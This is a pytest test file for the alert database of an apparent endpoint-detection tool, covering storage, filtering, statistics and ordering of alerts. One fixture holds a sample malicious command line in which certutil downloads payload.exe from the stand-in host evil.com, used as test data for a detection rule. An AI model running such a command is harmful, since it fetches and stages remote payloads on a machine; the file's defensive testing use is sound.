"""
Tests for database module
"""
import pytest
import tempfile
import os
from datetime import datetime, timedelta
from pathlib import Path
from core.database import AlertDatabase
from core.engine import Alert
from collectors.base import Event


@pytest.fixture
def temp_db():
    """Create a temporary database for testing"""
    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as f:
        db_path = f.name

    db = AlertDatabase(db_path)
    yield db
    db.close()

    # Clean up
    if os.path.exists(db_path):
        os.unlink(db_path)


@pytest.fixture
def sample_alert():
    """Create a sample alert for testing"""
    event = Event(
        timestamp=datetime(2025, 1, 15, 12, 0, 0),
        platform='windows',
        process_name='certutil.exe',
        command_line='certutil.exe -urlcache -split -f http://evil.com/payload.exe',
        user='baduser',
        process_id=1234,
        parent_process_name='cmd.exe'
    )

    alert = Alert(
        rule_id='WIN-001',
        rule_name='Certutil Download',
        severity='high',
        event=event,
        timestamp=event.timestamp,
        mitre_attack=['T1105', 'T1140'],
        description='Suspicious certutil download',
        response=['Investigate', 'Block'],
        score=130
    )

    return alert


def test_database_creation(temp_db):
    """Test database file is created"""
    assert temp_db.connection is not None
    assert temp_db.db_path.exists()


def test_database_schema(temp_db):
    """Test database schema is created correctly"""
    cursor = temp_db.connection.cursor()

    # Check table exists
    cursor.execute("""
        SELECT name FROM sqlite_master
        WHERE type='table' AND name='alerts'
    """)
    assert cursor.fetchone() is not None

    # Check indexes exist
    cursor.execute("""
        SELECT name FROM sqlite_master
        WHERE type='index'
    """)
    indexes = [row[0] for row in cursor.fetchall()]
    assert 'idx_timestamp' in indexes
    assert 'idx_severity' in indexes
    assert 'idx_score' in indexes
    assert 'idx_platform' in indexes


def test_save_alert(temp_db, sample_alert):
    """Test saving an alert returns valid ID"""
    alert_id = temp_db.save_alert(sample_alert)

    assert isinstance(alert_id, int)
    assert alert_id > 0


def test_save_and_retrieve_alert(temp_db, sample_alert):
    """Test saving and retrieving an alert"""
    alert_id = temp_db.save_alert(sample_alert)

    alerts = temp_db.get_alerts()

    assert len(alerts) == 1
    retrieved = alerts[0]
    assert retrieved['id'] == alert_id
    assert retrieved['rule_id'] == 'WIN-001'
    assert retrieved['rule_name'] == 'Certutil Download'
    assert retrieved['severity'] == 'high'
    assert retrieved['score'] == 130
    assert retrieved['platform'] == 'windows'
    assert retrieved['process_name'] == 'certutil.exe'
    assert retrieved['user'] == 'baduser'
    assert retrieved['parent_process_name'] == 'cmd.exe'


def test_alert_json_fields(temp_db, sample_alert):
    """Test JSON fields are stored and retrieved correctly"""
    temp_db.save_alert(sample_alert)
    alerts = temp_db.get_alerts()

    retrieved = alerts[0]
    assert isinstance(retrieved['mitre_attack'], list)
    assert 'T1105' in retrieved['mitre_attack']
    assert 'T1140' in retrieved['mitre_attack']

    assert isinstance(retrieved['response'], list)
    assert 'Investigate' in retrieved['response']
    assert 'Block' in retrieved['response']

    assert isinstance(retrieved['event_data'], dict)
    assert retrieved['event_data']['process_name'] == 'certutil.exe'


def test_get_alerts_with_limit(temp_db):
    """Test get_alerts respects limit parameter"""
    # Create multiple alerts
    for i in range(10):
        event = Event(
            timestamp=datetime.now(),
            platform='windows',
            process_name=f'process{i}.exe',
            command_line=f'command{i}',
            user='user',
            process_id=1000 + i
        )
        alert = Alert(
            rule_id=f'WIN-{i:03d}',
            rule_name=f'Rule {i}',
            severity='medium',
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=50
        )
        temp_db.save_alert(alert)

    # Test limit
    alerts = temp_db.get_alerts(limit=5)
    assert len(alerts) == 5


def test_get_alerts_time_filtering(temp_db):
    """Test time-based filtering of alerts"""
    base_time = datetime(2025, 1, 15, 12, 0, 0)

    # Create alerts at different times
    for i in range(5):
        event = Event(
            timestamp=base_time + timedelta(hours=i),
            platform='windows',
            process_name='test.exe',
            command_line='test',
            user='user',
            process_id=1000 + i
        )
        alert = Alert(
            rule_id='WIN-001',
            rule_name='Test',
            severity='low',
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=25
        )
        temp_db.save_alert(alert)

    # Query with start time
    start = base_time + timedelta(hours=2)
    alerts = temp_db.get_alerts(start_time=start)
    assert len(alerts) == 3  # Hours 2, 3, 4

    # Query with end time
    end = base_time + timedelta(hours=2)
    alerts = temp_db.get_alerts(end_time=end)
    assert len(alerts) == 3  # Hours 0, 1, 2

    # Query with both
    start = base_time + timedelta(hours=1)
    end = base_time + timedelta(hours=3)
    alerts = temp_db.get_alerts(start_time=start, end_time=end)
    assert len(alerts) == 3  # Hours 1, 2, 3


def test_get_alerts_by_severity(temp_db):
    """Test filtering alerts by severity"""
    severities = ['critical', 'high', 'medium', 'low']

    for sev in severities:
        event = Event(
            timestamp=datetime.now(),
            platform='windows',
            process_name='test.exe',
            command_line='test',
            user='user',
            process_id=1234
        )
        alert = Alert(
            rule_id='WIN-001',
            rule_name='Test',
            severity=sev,
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=50
        )
        temp_db.save_alert(alert)

    # Test each severity
    high_alerts = temp_db.get_alerts_by_severity('high')
    assert len(high_alerts) == 1
    assert high_alerts[0]['severity'] == 'high'

    critical_alerts = temp_db.get_alerts_by_severity('critical')
    assert len(critical_alerts) == 1
    assert critical_alerts[0]['severity'] == 'critical'


def test_get_alerts_by_platform(temp_db):
    """Test filtering alerts by platform"""
    platforms = ['windows', 'linux', 'macos']

    for platform in platforms:
        event = Event(
            timestamp=datetime.now(),
            platform=platform,
            process_name='test',
            command_line='test',
            user='user',
            process_id=1234
        )
        alert = Alert(
            rule_id='WIN-001',
            rule_name='Test',
            severity='medium',
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=50
        )
        temp_db.save_alert(alert)

    # Test each platform
    windows_alerts = temp_db.get_alerts_by_platform('windows')
    assert len(windows_alerts) == 1
    assert windows_alerts[0]['platform'] == 'windows'

    linux_alerts = temp_db.get_alerts_by_platform('linux')
    assert len(linux_alerts) == 1
    assert linux_alerts[0]['platform'] == 'linux'


def test_get_high_score_alerts(temp_db):
    """Test filtering alerts by score threshold"""
    scores = [25, 50, 75, 100, 130, 150]

    for score in scores:
        event = Event(
            timestamp=datetime.now(),
            platform='windows',
            process_name='test.exe',
            command_line='test',
            user='user',
            process_id=1234
        )
        alert = Alert(
            rule_id='WIN-001',
            rule_name='Test',
            severity='medium',
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=score
        )
        temp_db.save_alert(alert)

    # Get alerts with score >= 100
    high_score_alerts = temp_db.get_high_score_alerts(100)
    assert len(high_score_alerts) == 3  # 100, 130, 150
    assert all(a['score'] >= 100 for a in high_score_alerts)

    # Verify sorted by score descending
    assert high_score_alerts[0]['score'] == 150
    assert high_score_alerts[1]['score'] == 130
    assert high_score_alerts[2]['score'] == 100


def test_get_stats_empty_database(temp_db):
    """Test statistics on empty database"""
    stats = temp_db.get_stats()

    assert stats['total_alerts'] == 0
    assert stats['by_severity'] == {}
    assert stats['by_platform'] == {}
    assert stats['score_distribution']['0-50'] == 0
    assert stats['score_distribution']['51-100'] == 0
    assert stats['score_distribution']['101-150'] == 0
    assert stats['alerts_last_24h'] == 0


def test_get_stats_with_data(temp_db):
    """Test statistics with data"""
    # Create diverse alerts
    test_data = [
        ('critical', 'windows', 150),
        ('high', 'windows', 130),
        ('high', 'linux', 100),
        ('medium', 'linux', 50),
        ('low', 'macos', 25),
    ]

    for severity, platform, score in test_data:
        event = Event(
            timestamp=datetime.now(),
            platform=platform,
            process_name='test.exe',
            command_line='test',
            user='user',
            process_id=1234
        )
        alert = Alert(
            rule_id='WIN-001',
            rule_name='Test',
            severity=severity,
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=score
        )
        temp_db.save_alert(alert)

    stats = temp_db.get_stats()

    assert stats['total_alerts'] == 5
    assert stats['by_severity']['critical'] == 1
    assert stats['by_severity']['high'] == 2
    assert stats['by_severity']['medium'] == 1
    assert stats['by_severity']['low'] == 1
    assert stats['by_platform']['windows'] == 2
    assert stats['by_platform']['linux'] == 2
    assert stats['by_platform']['macos'] == 1
    assert stats['score_distribution']['0-50'] == 2  # 25, 50
    assert stats['score_distribution']['51-100'] == 1  # 100
    assert stats['score_distribution']['101-150'] == 2  # 130, 150
    assert stats['alerts_last_24h'] == 5  # All recent


def test_stats_last_24h(temp_db):
    """Test 24-hour alert count in statistics"""
    now = datetime.now()

    # Create alert from 2 days ago
    event_old = Event(
        timestamp=now - timedelta(days=2),
        platform='windows',
        process_name='old.exe',
        command_line='old',
        user='user',
        process_id=1000
    )
    alert_old = Alert(
        rule_id='WIN-001',
        rule_name='Old',
        severity='low',
        event=event_old,
        timestamp=event_old.timestamp,
        mitre_attack=[],
        description='Old alert',
        response=[],
        score=25
    )
    temp_db.save_alert(alert_old)

    # Create alert from 1 hour ago
    event_recent = Event(
        timestamp=now - timedelta(hours=1),
        platform='windows',
        process_name='recent.exe',
        command_line='recent',
        user='user',
        process_id=2000
    )
    alert_recent = Alert(
        rule_id='WIN-002',
        rule_name='Recent',
        severity='high',
        event=event_recent,
        timestamp=event_recent.timestamp,
        mitre_attack=[],
        description='Recent alert',
        response=[],
        score=75
    )
    temp_db.save_alert(alert_recent)

    stats = temp_db.get_stats()
    assert stats['total_alerts'] == 2
    assert stats['alerts_last_24h'] == 1  # Only the recent one


def test_context_manager(temp_db):
    """Test database can be used as context manager"""
    db_path = temp_db.db_path
    temp_db.close()

    with AlertDatabase(str(db_path)) as db:
        event = Event(
            timestamp=datetime.now(),
            platform='windows',
            process_name='test.exe',
            command_line='test',
            user='user',
            process_id=1234
        )
        alert = Alert(
            rule_id='WIN-001',
            rule_name='Test',
            severity='medium',
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=50
        )
        db.save_alert(alert)

    # Verify alert was saved (open new connection)
    db2 = AlertDatabase(str(db_path))
    alerts = db2.get_alerts()
    assert len(alerts) == 1
    db2.close()


def test_close_connection(temp_db):
    """Test closing database connection"""
    temp_db.close()
    # Verify connection is closed (attempting to use it should fail)
    with pytest.raises(Exception):
        temp_db.connection.cursor()


def test_empty_mitre_and_response(temp_db):
    """Test handling alerts with empty MITRE and response lists"""
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='test.exe',
        command_line='test',
        user='user',
        process_id=1234
    )
    alert = Alert(
        rule_id='WIN-001',
        rule_name='Test',
        severity='low',
        event=event,
        timestamp=event.timestamp,
        mitre_attack=[],
        description='Test',
        response=[],
        score=25
    )

    temp_db.save_alert(alert)
    alerts = temp_db.get_alerts()

    assert len(alerts) == 1
    assert alerts[0]['mitre_attack'] == []
    assert alerts[0]['response'] == []


def test_none_parent_process(temp_db):
    """Test handling alerts with None parent process"""
    event = Event(
        timestamp=datetime.now(),
        platform='windows',
        process_name='test.exe',
        command_line='test',
        user='user',
        process_id=1234,
        parent_process_name=None
    )
    alert = Alert(
        rule_id='WIN-001',
        rule_name='Test',
        severity='low',
        event=event,
        timestamp=event.timestamp,
        mitre_attack=[],
        description='Test',
        response=[],
        score=25
    )

    temp_db.save_alert(alert)
    alerts = temp_db.get_alerts()

    assert len(alerts) == 1
    assert alerts[0]['parent_process_name'] is None


def test_multiple_saves_and_queries(temp_db, sample_alert):
    """Test multiple sequential save and query operations"""
    # Save multiple times
    ids = []
    for _ in range(3):
        alert_id = temp_db.save_alert(sample_alert)
        ids.append(alert_id)

    # Verify all saved
    alerts = temp_db.get_alerts()
    assert len(alerts) == 3

    # Verify IDs are unique and sequential
    assert len(set(ids)) == 3
    assert ids == sorted(ids)


def test_query_ordering(temp_db):
    """Test that queries return results in correct order"""
    base_time = datetime(2025, 1, 1, 12, 0, 0)

    # Create alerts with different timestamps
    for i in range(5):
        event = Event(
            timestamp=base_time + timedelta(hours=i),
            platform='windows',
            process_name='test.exe',
            command_line='test',
            user='user',
            process_id=1000 + i
        )
        alert = Alert(
            rule_id=f'WIN-{i:03d}',
            rule_name=f'Test {i}',
            severity='medium',
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=50
        )
        temp_db.save_alert(alert)

    # Get alerts - should be ordered by timestamp DESC
    alerts = temp_db.get_alerts()

    # First alert should have highest timestamp
    assert alerts[0]['rule_id'] == 'WIN-004'
    assert alerts[4]['rule_id'] == 'WIN-000'


def test_score_distribution_edge_cases(temp_db):
    """Test score distribution with boundary values"""
    # Test exact boundaries
    boundary_scores = [0, 50, 51, 100, 101, 150]

    for score in boundary_scores:
        event = Event(
            timestamp=datetime.now(),
            platform='windows',
            process_name='test.exe',
            command_line='test',
            user='user',
            process_id=1234
        )
        alert = Alert(
            rule_id='WIN-001',
            rule_name='Test',
            severity='low',
            event=event,
            timestamp=event.timestamp,
            mitre_attack=[],
            description='Test',
            response=[],
            score=score
        )
        temp_db.save_alert(alert)

    stats = temp_db.get_stats()

    # 0, 50 in 0-50 range
    assert stats['score_distribution']['0-50'] == 2
    # 51, 100 in 51-100 range
    assert stats['score_distribution']['51-100'] == 2
    # 101, 150 in 101-150 range
    assert stats['score_distribution']['101-150'] == 2
